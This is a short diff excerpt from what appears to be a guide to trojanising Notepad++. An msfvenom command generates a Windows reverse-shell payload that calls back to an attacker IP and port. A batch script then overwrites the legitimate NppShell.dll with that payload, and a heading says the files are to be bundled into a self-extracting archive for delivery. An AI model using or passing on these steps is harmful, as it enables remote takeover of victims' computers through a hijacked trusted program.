@@ -31,8 +31,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_po
 Write a simple install.bat:
 
 echo off
+
 cls
+
 copy /Y NppShell.dll "C:\Program Files\Notepad++\contextMenu\NppShell.dll"
+
 This script overwrites the legitimate NppShell.dll in Notepad++.
 
 3️⃣ Bundle files using SFX archive
